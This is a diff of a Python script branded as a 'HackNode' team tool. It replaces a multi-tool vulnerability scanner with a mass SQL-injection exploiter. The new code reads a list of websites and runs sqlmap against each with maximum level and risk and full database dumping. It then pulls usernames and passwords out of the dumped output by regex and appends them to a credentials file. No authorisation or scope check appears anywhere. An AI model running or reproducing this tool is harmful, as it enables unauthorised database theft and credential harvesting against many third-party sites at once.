@@ -1,82 +1,85 @@
-import os
 import subprocess
 import pyfiglet
-from colorama import Fore, init
+import re
+from time import sleep
 
-# Initialize colorama
-init(autoreset=True)
+def print_banner():
+    # Display banner with title and information
+    banner = pyfiglet.figlet_format("Tools HackNode", font="slant")
+    print("\033[96m" + banner)  # Light Blue color
+    print("\033[92mThis tool is exclusive to the HackNode team.")
+    print("\033[94mChannel link: https://t.me/hacknode_1\n")
+    print("\033[95m" + "=" * 80)
+    print("\033[94m" + "This tool is exclusive to the HackNode team.".center(80))
+    print("\033[94m" + "Channel link: https://t.me/hacknode_1".center(80))
+    print("\033[95m" + "=" * 80 + "\n")
 
-# Function to check if the script is running as root
-def check_root():
-    if os.geteuid() != 0:
-        print(Fore.RED + "[*] This script requires root privileges. Please run it as root (sudo).")
-        exit(1)
+def exploit_sqlmap(url):
+    try:
+        # Run SQLmap command to check for SQL injection vulnerability
+        print(f"\033[94mRunning SQLmap on {url}...\n")
+        
+        result = subprocess.run(
+            ["sqlmap", "-u", url, "--batch", "--dump", "--level=5", "--risk=3", "--technique=BEUSTQ", "--dbs", "--output-dir=output", "--threads=10"],
+            capture_output=True, text=True
+        )
+        
+        # Check if SQLmap found any database and dumped data
+        if "database" in result.stdout and "dumped" in result.stdout:
+            print("\033[92mSQL Injection vulnerability found!")
+            extract_admin_credentials(result.stdout, url)
+        else:
+            print(f"\033[91mNo SQL Injection vulnerability found at: {url}\n")
+    
+    except Exception as e:
+        print(f"\033[91mError while running SQLmap on {url}: {e}")
+
+def extract_admin_credentials(data, url):
+    # Regular expressions to search for common username and password patterns
+    username = None
+    password = None
+    
+    # Look for common username/email and password patterns in the dump output
+    username_match = re.search(r"(username|email)\s*=\s*['\"]?(\S+)['\"]?", data)
+    password_match = re.search(r"(password)\s*=\s*['\"]?(\S+)['\"]?", data)
+
+    if username_match and password_match:
+        username = username_match.group(2)
+        password = password_match.group(2)
+        print(f"\033[92mCredentials found!\nUsername: {username}\nPassword: {password}\n")
+        save_to_file(username, password, url)
     else:
-        print(Fore.GREEN + "[*] Running with root privileges...")
+        print(f"\033[91mNo valid admin credentials found for {url}")
 
-# Function to check for SQL Injection using SQLMap
-def check_sql_injection(url):
-    print(Fore.YELLOW + "[*] Checking for SQL Injection on the URL:", url)
-    try:
-        result = subprocess.run(['sqlmap', '-u', url, '--batch', '--risk=3', '--level=5'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        if "available databases" in result.stdout:
-            print(Fore.GREEN + f"[+] SQL Injection vulnerability found in {url}")
-            print(Fore.GREEN + f"Vulnerable path: {url}")
-            print(Fore.GREEN + "Result:\n" + result.stdout)
-        else:
-            print(Fore.RED + "[-] No SQL Injection found")
-    except Exception as e:
-        print(Fore.RED + "[-] Error with SQLMap:", e)
+def save_to_file(username, password, url):
+    with open("extracted_credentials.txt", "a") as file:
+        file.write(f"Site: {url}\n")
+        file.write(f"Username: {username}\n")
+        file.write(f"Password: {password}\n")
+        file.write("=" * 50 + "\n\n")  # Add space between results
+    print(f"\033[92mData saved for {url}\n")
 
-# Function to check for XSS using XSSer
-def check_xss(url):
-    print(Fore.YELLOW + "[*] Checking for XSS on the URL:", url)
-    try:
-        result = subprocess.run(['xsser', '--url', url, '--batch'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        if "XSS payloads" in result.stdout:
-            print(Fore.GREEN + f"[+] XSS vulnerability found in {url}")
-            print(Fore.GREEN + f"Vulnerable path: {url}")
-            print(Fore.GREEN + "Result:\n" + result.stdout)
-        else:
-            print(Fore.RED + "[-] No XSS found")
-    except Exception as e:
-        print(Fore.RED + "[-] Error with XSSer:", e)
+def load_websites(filename):
+    with open(filename, "r") as file:
+        return [line.strip() for line in file.readlines()]
 
-# Function to check for Directory Traversal (IDOR) using DirBuster
-def check_idor(url):
-    print(Fore.YELLOW + "[*] Checking for IDOR on the URL:", url)
-    try:
-        result = subprocess.run(['dirbuster', '-u', url, '-t', '100', '-w', '/path/to/wordlist'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        if "found" in result.stdout:
-            print(Fore.GREEN + f"[+] IDOR vulnerability found in {url}")
-            print(Fore.GREEN + f"Vulnerable path: {url}")
-            print(Fore.GREEN + "Result:\n" + result.stdout)
-        else:
-            print(Fore.RED + "[-] No IDOR found")
-    except Exception as e:
-        print(Fore.RED + "[-] Error with DirBuster:", e)
-
-# Main function to read the URLs from the file and scan them
 def main():
-    check_root()  # Check if the script is running as root
-
-    file_path = input(Fore.CYAN + "Enter the path to the list file (list.txt): ").strip()
-    if not os.path.exists(file_path):
-        print(Fore.RED + "The file does not exist!")
+    print_banner()
+    
+    # Ask the user to input the file name for the list of websites
+    list_file = input("Enter the name of the list file (e.g., list.txt): ").strip()
+    
+    try:
+        websites = load_websites(list_file)
+    except FileNotFoundError:
+        print(f"\033[91mFile {list_file} not found. Please check the file path and try again.")
         return
 
-    with open(file_path, "r") as file:
-        urls = file.readlines()
-
-    print(Fore.CYAN + "[*] Starting the scan for all sites in the list...")
-
-    for url in urls:
-        url = url.strip()
-        if url:
-            print(Fore.CYAN + f"\n[*] Scanning site: {url}")
-            check_sql_injection(url)
-            check_xss(url)
-            check_idor(url)
+    # Process each website in the list
+    for site in websites:
+        print(f"\033[96m\nTesting site: {site}\n")
+        exploit_sqlmap(site)
+        sleep(2)  # Wait between sites to avoid overloading the server
 
 if __name__ == "__main__":
     main()
